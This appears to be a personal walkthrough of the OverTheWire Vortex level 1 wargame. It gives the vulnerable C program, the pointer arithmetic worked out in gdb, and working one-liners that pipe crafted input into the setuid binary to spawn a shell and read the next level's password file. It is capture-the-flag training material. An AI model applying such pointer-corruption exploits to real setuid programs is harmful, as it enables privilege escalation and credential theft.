Challenge URL is <a href="http://www.overthewire.org/wargames/vortex/vortex1.shtml">HERE</a>

<<<CHALLENGE_CONTENT
Level 1

Canary Values
We are looking for a specific value in ptr. You may need to consider how bash handles EOF..
Reading Material
Smashing the Stack for Fun and Profit
Code listing (vortex1.c)

	 1 #include <stdlib.h>
	 2 #include <unistd.h>
	 3 #include <string.h>
	 4 #include <stdio.h>
	 5 
	 6 
	 7 #define e(); if(((unsigned int)ptr & 0xff000000)==0xca000000) { setresuid(geteuid(), geteuid(), geteuid()); execlp("/bin/sh", "sh", "-i", NULL); }
	 8 
	 9 void print(unsigned char *buf, int len)
	10 {
	11         int i;
	12 
	13         printf("[ ");
	14         for(i=0; i < len; i++) printf("%x ", buf[i]); 
	15         printf(" ]\n");
	16 }
	17 
	18 int main()
	19 {
	20         unsigned char buf[512];
	21         unsigned char *ptr = buf + (sizeof(buf)/2);
	22         unsigned int x;
	23 
	24         while((x = getchar()) != EOF) {
	25                 switch(x) {
	26                         case '\n': print(buf, sizeof(buf)); continue; break;
	27                         case '\\': ptr--; break; 
	28                         default: e(); if(ptr > buf + sizeof(buf)) continue; ptr++[0] = x; break;
	29                 }
	30         }
	31         printf("All done\n");
	32 }

CHALLENGE_CONTENT

Comment by me:

ESP --> 0xffffd520
ptr = 0x18(ESP) = 0xffffd538 --> 0xffffd63c
buffer = 0x1c(ESP) = 0xffffd53c

1. we can only write where ptr is pointing at (initially at 0xffffd63c)
2. ptr is located at $ESP+0x18 (from gdb), 
	ESP initially is at 0xffffd520
	ESP+0x18 = ESP+24 = 0xffffd538
3. So, we have to move the writing pointer to write at $ESP+0x18 located.
4. To move the writing pointer, from the program:
	type '\' : ptr--
	type other: ptr++
5. Therefore, moving the writing pointer back (0xffffd63c - 0xffffd538) = 260 
	Which means, type '\' * 260 times, then type '\xCA'
6. But when comparison, the program only check 'ptr' against 0xCA000000, which is the last byte of the 'ptr' pointer, so we only need to type '\' * 257 times then type '\xCA'. Let the '\xCA' saved, then put another character of anything to trigger the e() method again.
7. we can input into the program in another 2 ways(rather than type it in). We can use PIPE or REDIRECT, for example:
	using PIPE method : python -c 'print "\\"*257 +"\xCA"+"a"' | /vortex/vortex1
	or
	using REDIRECT method, by write to a file first, then redirect : 
		python -c 'print "\\"*257 +"\xCA"+"a"' > /tmp/anidear_vt1;
		/vortex/vortex1 < /tmp/anidear_vt1
8. Then comes the problem of EOF, either of the method will result in sending EOF(end-of-file) to the new spawn process(/bin/sh), which results in closing the shell.
9. by using 'cat' command to re-open the STDIN (for us to type in commands), after finish sending the exploit. So, we can:
	with PIPE method : 
		(python -c 'print "\\"*257 +"\xCA"+"a"'; cat) | /vortex/vortex1
	or
	with file method :
		(cat /tmp/anidear_vt1; cat) | /vortex/vortex1
		or
		(cat /tmp/anidear_vt1 - ) | /vortex/vortex1

10. After getting a shell, just 'cat /etc/vortex_pass/vortex2'. The password for next level is there.


OTHER WORK:
	- to compile code: gcc -o vortex1 -m32 -fno-stack-protector -Wl,-z,norelro vortex1.c

	- DEBUGGING
		- gdb /vortex/vortex1  		<<< To debug the process
		- disas						<<< (disassemble) show diassembly code of the process
		- b *0x080485b7				<<< (breakpoint) set breakpoint at 0x080485b7 (after mov    0x18(%esp),%eax) to read value in $eax, which is now the value of 'ptr'
		- r 						<<< (run) to run the process from start
		- r < /tmp/anidear_vt1		<<< (run) to run the process with arguments
		- x/x $eax					<<< view value in $eax
		- set $eax=0xca000000 		<<< set value in $eax to 0xCA000000
		- n 						<<< (next) run until exit the function
		- ni 						<<< (next instruction), step over
		- delete breakpoints		<<< delete all breakpoints
		- set inferior-tty /dev/pts/1 <<< enable STDIN for the child process
		- c 						<<< continue executions, runs
		- s   or   si				<<< (step) run next instruction, step into
		- start 					<<< just start the process, but not run

	- SOME ASSEMBLY
		0x080485b3 <+92>:	mov    0x18(%esp),%eax	<<<<<< where it reads from 'ptr'
		0x080485b7 <+96>:	and    $0xff000000,%eax
		0x080485bc <+101>:	cmp    $0xca000000,%eax		<<<<<< change to eax to 0xca000000
		0x080485c1 <+106>:	jne    0x8048602 <main+171> 	
		0x080485c3 <+108>:	call   0x8048440 <geteuid@plt>
		0x080485c8 <+113>:	mov    %eax,%esi
		0x080485ca <+115>:	call   0x8048440 <geteuid@plt>
		0x080485cf <+120>:	mov    %eax,%ebx
		0x080485d1 <+122>:	call   0x8048440 <geteuid@plt>


	- Conclusion with gdb debugging
		- easy to navigate and override the process flow. I can set any register to be anything as I want. 
		- the flaw is, when 'gdb' starts, it starts with our EUID (which is vortex1). When it spawn /vortex/vortex1 afterward, the process also has EUID=vortex1, which leads to /bin/sh to get the same EUID as vortex1 too.

	
